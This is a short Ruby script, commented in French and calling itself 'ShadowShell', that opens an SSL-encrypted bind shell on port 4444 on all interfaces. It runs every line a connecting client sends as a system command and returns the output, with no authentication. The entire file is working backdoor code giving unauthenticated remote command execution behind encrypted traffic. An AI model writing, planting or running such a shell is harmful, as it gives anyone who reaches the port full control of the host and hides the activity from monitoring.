require 'socket'
require 'openssl'

# Configuration
PORT = 4444
HOST = '0.0.0.0' # Écoute sur toutes les interfaces (CHANGE THIS)
SSL_CERT = 'cert.pem' # Certificat SSL
SSL_KEY = 'key.pem'   # Clé privée SSL

# Fonction pour charger le certificat SSL
def setup_ssl_context
  context = OpenSSL::SSL::SSLContext.new
  context.cert = OpenSSL::X509::Certificate.new(File.read(SSL_CERT))
  context.key = OpenSSL::PKey::RSA.new(File.read(SSL_KEY))
  context
end

# Fonction pour gérer les commandes du client
def handle_client(client)
  client_ip, client_port = client.peeraddr[3], client.peeraddr[1]
  puts "[+] Connexion établie avec #{client_ip}:#{client_port}"

  begin
    while (command = client.gets)
      command.chomp! # Supprime les sauts de ligne
      break if command.downcase == "exit" # Permet au client de quitter proprement

      # Exécute la commande sur le système
      output = `#{command} 2>&1`
      client.puts output # Envoie la sortie au client
    end
  rescue => e
    puts "[!] Erreur lors de la gestion de la connexion : #{e.message}"
    client.puts "Erreur : #{e.message}"
  ensure
    # Fermeture de la connexion
    client.close
    puts "[+] Connexion fermée avec #{client_ip}:#{client_port}"
  end
end

# Fonction principale
def start_server
  begin
    # Création du socket serveur
    server = TCPServer.new(HOST, PORT)

    # Configuration SSL
    ssl_context = setup_ssl_context
    ssl_server = OpenSSL::SSL::SSLServer.new(server, ssl_context)

    puts "[*] ShadowShell en écoute sécurisée (SSL) sur #{HOST}:#{PORT}..."

    loop do
      # Attente d'une connexion entrante
      client = ssl_server.accept
      Thread.new { handle_client(client) } # Gestion multi-clients via threads
    end
  rescue => e
    puts "[!] Erreur critique : #{e.message}"
  ensure
    # Fermeture propre du serveur en cas d'erreur ou d'interruption
    ssl_server&.close
    server&.close
    puts "[*] Serveur arrêté."
  end
end

# Démarrage du serveur
start_server